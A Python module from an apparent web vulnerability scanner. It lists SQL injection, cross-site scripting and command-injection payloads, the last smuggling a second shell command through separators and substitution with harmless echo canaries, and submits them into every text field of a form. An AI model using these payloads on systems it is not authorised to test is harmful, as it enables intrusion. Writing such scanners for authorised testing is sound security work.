"""
Payload Injector Module
=======================
Injects predefined non-destructive test payloads into form fields and collects responses.
"""

import requests

# ── Payload definitions ──────────────────────────────────────────────────────

SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--+",
    "1 OR 1=1",
    "' UNION SELECT NULL--",
    "'; SELECT 1--",  # Non-destructive stacked-query probe
    "1' AND '1'='1",
]

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
]

# Non-destructive Unix shell arithmetic canary probes (7*191 -> TF1337)
CMDI_PAYLOADS_UNIX = [
    ";echo TF$((7*191))",
    "|echo TF$((7*191))",
    "&&echo TF$((7*191))",
    "`echo TF$((7*191))`",
    "$(echo TF$((7*191)))",
]

# Non-destructive Windows cmd.exe canary probes (%OS% -> TFWINWindows_NT)
CMDI_PAYLOADS_WINDOWS = [
    "&echo TFWIN%OS%",
    "|echo TFWIN%OS%",
    "&&echo TFWIN%OS%",
]

# Combined list so both Unix and Windows (WAMP) targets are tested
CMDI_PAYLOADS = CMDI_PAYLOADS_UNIX + CMDI_PAYLOADS_WINDOWS


def inject_payloads(
    form: dict,
    payloads: list[str],
    timeout: int = 30,
    max_requests: int | None = None,
    session: requests.Session | None = None,
) -> list[dict]:
    """
    Submit *payloads* into every text-like field of *form* and return responses.

    Parameters
    ----------
    form : dict
        A form dict as returned by ``form_extractor.extract_forms``.
    payloads : list[str]
        List of payload strings to inject.
    timeout : int
        HTTP request timeout in seconds.
    max_requests : int | None
        Optional cap on the maximum number of HTTP requests to send.
    session : requests.Session | None
        Optional pre-configured ``requests.Session`` (used when a session
        cookie is provided).

    Returns
    -------
    list[dict]
        Each entry:
        - payload       : str
        - field         : str   (input name the payload was injected into)
        - status_code   : int
        - body          : str   (response body text)
    """
    results = []
    action = form["action"]
    method = form["method"]
    requests_sent = 0
    http = session if session is not None else requests

    for payload in payloads:
        for inp in form["inputs"]:
            # Only inject into text-like fields
            if inp["type"] in ("submit", "hidden", "button", "image", "file"):
                continue

            if max_requests is not None and requests_sent >= max_requests:
                return results
            requests_sent += 1

            # Build form data: use default values, override current field
            data = {}
            for field in form["inputs"]:
                if field["name"] == inp["name"]:
                    data[field["name"]] = payload
                else:
                    data[field["name"]] = field["value"] or "test"

            try:
                if method == "post":
                    resp = http.post(
                        action, data=data, timeout=timeout, allow_redirects=True
                    )
                else:
                    resp = http.get(
                        action, params=data, timeout=timeout, allow_redirects=True
                    )

                results.append({
                    "payload": payload,
                    "field": inp["name"],
                    "status_code": resp.status_code,
                    "body": resp.text,
                })
            except requests.RequestException:
                # Network errors are silently skipped for robustness
                continue

    return results
